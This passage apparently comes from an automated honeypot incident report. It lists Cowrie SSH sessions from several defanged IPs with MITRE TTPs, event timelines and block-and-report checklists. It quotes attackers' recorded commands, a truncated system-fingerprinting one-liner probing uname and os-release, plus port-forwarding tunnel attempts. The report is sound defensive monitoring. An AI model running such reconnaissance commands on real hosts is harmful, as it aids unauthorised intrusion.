| `2026-07-09 19:09:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-563c0af5d282

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:10 |
| **Last Seen** | 2026-07-09 19:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:10:43` | `cowrie.session.connect` |
| `2026-07-09 19:10:43` | `cowrie.client.version` |
| `2026-07-09 19:10:43` | `cowrie.client.kex` |
| `2026-07-09 19:10:44` | `cowrie.login.success` |
| `2026-07-09 19:10:46` | `cowrie.session.params` |
| `2026-07-09 19:10:46` | `cowrie.command.input` |
| `2026-07-09 19:10:46` | `cowrie.command.input` |
| `2026-07-09 19:10:46` | `cowrie.command.input` |
| `2026-07-09 19:10:46` | `cowrie.command.input` |
| `2026-07-09 19:10:46` | `cowrie.command.input` |
| `2026-07-09 19:10:46` | `cowrie.command.success` |
| `2026-07-09 19:10:46` | `cowrie.command.input` |
| `2026-07-09 19:10:46` | `cowrie.command.input` |
| `2026-07-09 19:10:46` | `cowrie.command.input` |
| `2026-07-09 19:10:46` | `cowrie.command.input` |
| `2026-07-09 19:10:46` | `cowrie.log.closed` |
| `2026-07-09 19:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-167bb3ed37dd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-09 19:11 |
| **Last Seen** | 2026-07-09 19:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:11:25` | `cowrie.session.connect` |
| `2026-07-09 19:11:25` | `cowrie.client.version` |
| `2026-07-09 19:11:25` | `cowrie.client.kex` |
| `2026-07-09 19:11:25` | `cowrie.login.success` |
| `2026-07-09 19:11:27` | `cowrie.session.params` |
| `2026-07-09 19:11:27` | `cowrie.command.input` |
| `2026-07-09 19:11:27` | `cowrie.log.closed` |
| `2026-07-09 19:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e48496b880d0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:12 |
| **Last Seen** | 2026-07-09 19:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:12:02` | `cowrie.session.connect` |
| `2026-07-09 19:12:02` | `cowrie.client.version` |
| `2026-07-09 19:12:02` | `cowrie.client.kex` |
| `2026-07-09 19:12:04` | `cowrie.login.success` |
| `2026-07-09 19:12:05` | `cowrie.session.params` |
| `2026-07-09 19:12:05` | `cowrie.command.input` |
| `2026-07-09 19:12:05` | `cowrie.command.input` |
| `2026-07-09 19:12:05` | `cowrie.command.input` |
| `2026-07-09 19:12:05` | `cowrie.command.input` |
| `2026-07-09 19:12:05` | `cowrie.command.input` |
| `2026-07-09 19:12:05` | `cowrie.command.success` |
| `2026-07-09 19:12:05` | `cowrie.command.input` |
| `2026-07-09 19:12:05` | `cowrie.command.input` |
| `2026-07-09 19:12:05` | `cowrie.command.input` |
| `2026-07-09 19:12:05` | `cowrie.command.input` |
| `2026-07-09 19:12:06` | `cowrie.log.closed` |
| `2026-07-09 19:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b3491a2d41c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:13 |
| **Last Seen** | 2026-07-09 19:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:13:24` | `cowrie.session.connect` |
| `2026-07-09 19:13:24` | `cowrie.client.version` |
| `2026-07-09 19:13:24` | `cowrie.client.kex` |
| `2026-07-09 19:13:26` | `cowrie.login.success` |
| `2026-07-09 19:13:27` | `cowrie.session.params` |
| `2026-07-09 19:13:27` | `cowrie.command.input` |
| `2026-07-09 19:13:27` | `cowrie.command.input` |
| `2026-07-09 19:13:27` | `cowrie.command.input` |
| `2026-07-09 19:13:27` | `cowrie.command.input` |
| `2026-07-09 19:13:27` | `cowrie.command.input` |
| `2026-07-09 19:13:27` | `cowrie.command.success` |
| `2026-07-09 19:13:27` | `cowrie.command.input` |
| `2026-07-09 19:13:27` | `cowrie.command.input` |
| `2026-07-09 19:13:27` | `cowrie.command.input` |
| `2026-07-09 19:13:27` | `cowrie.command.input` |
| `2026-07-09 19:13:27` | `cowrie.log.closed` |
| `2026-07-09 19:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea0377d69f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:14 |
| **Last Seen** | 2026-07-09 19:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:14:40` | `cowrie.session.connect` |
| `2026-07-09 19:14:41` | `cowrie.client.version` |
| `2026-07-09 19:14:41` | `cowrie.client.kex` |
| `2026-07-09 19:14:43` | `cowrie.login.success` |
| `2026-07-09 19:14:44` | `cowrie.session.params` |
| `2026-07-09 19:14:44` | `cowrie.command.input` |
| `2026-07-09 19:14:44` | `cowrie.command.input` |
| `2026-07-09 19:14:44` | `cowrie.command.input` |
| `2026-07-09 19:14:44` | `cowrie.command.input` |
| `2026-07-09 19:14:44` | `cowrie.command.input` |
| `2026-07-09 19:14:44` | `cowrie.command.success` |
| `2026-07-09 19:14:44` | `cowrie.command.input` |
| `2026-07-09 19:14:44` | `cowrie.command.input` |
| `2026-07-09 19:14:44` | `cowrie.command.input` |
| `2026-07-09 19:14:44` | `cowrie.command.input` |
| `2026-07-09 19:14:45` | `cowrie.log.closed` |
| `2026-07-09 19:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a0a743bfe3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:15 |
| **Last Seen** | 2026-07-09 19:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:15:57` | `cowrie.session.connect` |
| `2026-07-09 19:15:58` | `cowrie.client.version` |
| `2026-07-09 19:15:58` | `cowrie.client.kex` |
| `2026-07-09 19:16:00` | `cowrie.login.success` |
| `2026-07-09 19:16:01` | `cowrie.session.params` |
| `2026-07-09 19:16:01` | `cowrie.command.input` |
| `2026-07-09 19:16:01` | `cowrie.command.input` |
| `2026-07-09 19:16:01` | `cowrie.command.input` |
| `2026-07-09 19:16:01` | `cowrie.command.input` |
| `2026-07-09 19:16:01` | `cowrie.command.input` |
| `2026-07-09 19:16:01` | `cowrie.command.success` |
| `2026-07-09 19:16:01` | `cowrie.command.input` |
| `2026-07-09 19:16:01` | `cowrie.command.input` |
| `2026-07-09 19:16:01` | `cowrie.command.input` |
| `2026-07-09 19:16:01` | `cowrie.command.input` |
| `2026-07-09 19:16:02` | `cowrie.log.closed` |
| `2026-07-09 19:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ae557a8d872

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-09 19:16 |
| **Last Seen** | 2026-07-09 19:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:16:31` | `cowrie.session.connect` |
| `2026-07-09 19:16:31` | `cowrie.client.version` |
| `2026-07-09 19:16:31` | `cowrie.client.kex` |
| `2026-07-09 19:16:31` | `cowrie.login.success` |
| `2026-07-09 19:16:31` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:16:31` | `cowrie.direct-tcpip.data` |
| `2026-07-09 19:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-074d4d98a6e2

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-09 19:16 |
| **Last Seen** | 2026-07-09 19:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:16:39` | `cowrie.session.connect` |
| `2026-07-09 19:16:39` | `cowrie.client.version` |
| `2026-07-09 19:16:39` | `cowrie.client.kex` |
| `2026-07-09 19:16:40` | `cowrie.login.success` |
| `2026-07-09 19:16:40` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:16:40` | `cowrie.direct-tcpip.data` |
| `2026-07-09 19:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a688db1cc539

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-09 19:16 |
| **Last Seen** | 2026-07-09 19:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:16:48` | `cowrie.session.connect` |
| `2026-07-09 19:16:48` | `cowrie.client.version` |
| `2026-07-09 19:16:48` | `cowrie.client.kex` |
| `2026-07-09 19:16:48` | `cowrie.login.success` |
| `2026-07-09 19:16:48` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:16:48` | `cowrie.direct-tcpip.data` |
| `2026-07-09 19:16:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a94caa60859e

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-09 19:16 |
| **Last Seen** | 2026-07-09 19:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:16:56` | `cowrie.session.connect` |
| `2026-07-09 19:16:56` | `cowrie.client.version` |
| `2026-07-09 19:16:56` | `cowrie.client.kex` |
| `2026-07-09 19:16:57` | `cowrie.login.success` |
| `2026-07-09 19:16:57` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:16:57` | `cowrie.direct-tcpip.data` |
| `2026-07-09 19:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8840f95cd70a

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-09 19:17 |
| **Last Seen** | 2026-07-09 19:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:17:06` | `cowrie.session.connect` |
| `2026-07-09 19:17:06` | `cowrie.client.version` |
| `2026-07-09 19:17:06` | `cowrie.client.kex` |
| `2026-07-09 19:17:07` | `cowrie.login.success` |
| `2026-07-09 19:17:07` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:17:07` | `cowrie.direct-tcpip.data` |
| `2026-07-09 19:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f41df253bdc0

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-09 19:17 |
| **Last Seen** | 2026-07-09 19:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:17:15` | `cowrie.session.connect` |
| `2026-07-09 19:17:15` | `cowrie.client.version` |
| `2026-07-09 19:17:15` | `cowrie.client.kex` |
| `2026-07-09 19:17:15` | `cowrie.login.success` |
| `2026-07-09 19:17:15` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:17:15` | `cowrie.direct-tcpip.data` |
| `2026-07-09 19:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd043b7a6867

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:17 |
| **Last Seen** | 2026-07-09 19:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:17:15` | `cowrie.session.connect` |
| `2026-07-09 19:17:15` | `cowrie.client.version` |
| `2026-07-09 19:17:15` | `cowrie.client.kex` |
| `2026-07-09 19:17:17` | `cowrie.login.success` |
| `2026-07-09 19:17:19` | `cowrie.session.params` |
| `2026-07-09 19:17:19` | `cowrie.command.input` |
| `2026-07-09 19:17:19` | `cowrie.command.input` |
| `2026-07-09 19:17:19` | `cowrie.command.input` |
| `2026-07-09 19:17:19` | `cowrie.command.input` |
| `2026-07-09 19:17:19` | `cowrie.command.input` |
| `2026-07-09 19:17:19` | `cowrie.command.success` |
| `2026-07-09 19:17:19` | `cowrie.command.input` |
| `2026-07-09 19:17:19` | `cowrie.command.input` |
| `2026-07-09 19:17:19` | `cowrie.command.input` |
| `2026-07-09 19:17:19` | `cowrie.command.input` |
| `2026-07-09 19:17:20` | `cowrie.log.closed` |
| `2026-07-09 19:17:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14782f4143d4

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-09 19:17 |
| **Last Seen** | 2026-07-09 19:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:17:24` | `cowrie.session.connect` |
| `2026-07-09 19:17:24` | `cowrie.client.version` |
| `2026-07-09 19:17:24` | `cowrie.client.kex` |
| `2026-07-09 19:17:24` | `cowrie.login.success` |
| `2026-07-09 19:17:25` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:17:25` | `cowrie.direct-tcpip.data` |
| `2026-07-09 19:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a87fecdc12ae

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-07-09 19:17 |
| **Last Seen** | 2026-07-09 19:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:17:37` | `cowrie.session.connect` |
| `2026-07-09 19:17:37` | `cowrie.client.version` |
| `2026-07-09 19:17:37` | `cowrie.client.kex` |
| `2026-07-09 19:17:38` | `cowrie.login.success` |
| `2026-07-09 19:17:38` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:17:38` | `cowrie.direct-tcpip.data` |
| `2026-07-09 19:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b550d23b3176

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:18 |
| **Last Seen** | 2026-07-09 19:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:18:31` | `cowrie.session.connect` |
| `2026-07-09 19:18:32` | `cowrie.client.version` |
| `2026-07-09 19:18:32` | `cowrie.client.kex` |
| `2026-07-09 19:18:33` | `cowrie.login.success` |
| `2026-07-09 19:18:35` | `cowrie.session.params` |
| `2026-07-09 19:18:35` | `cowrie.command.input` |
| `2026-07-09 19:18:35` | `cowrie.command.input` |
| `2026-07-09 19:18:35` | `cowrie.command.input` |
| `2026-07-09 19:18:35` | `cowrie.command.input` |
| `2026-07-09 19:18:35` | `cowrie.command.input` |
| `2026-07-09 19:18:35` | `cowrie.command.success` |
| `2026-07-09 19:18:35` | `cowrie.command.input` |
| `2026-07-09 19:18:35` | `cowrie.command.input` |
| `2026-07-09 19:18:35` | `cowrie.command.input` |
| `2026-07-09 19:18:35` | `cowrie.command.input` |
| `2026-07-09 19:18:35` | `cowrie.log.closed` |
| `2026-07-09 19:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-092e012dd12a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:19 |
| **Last Seen** | 2026-07-09 19:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

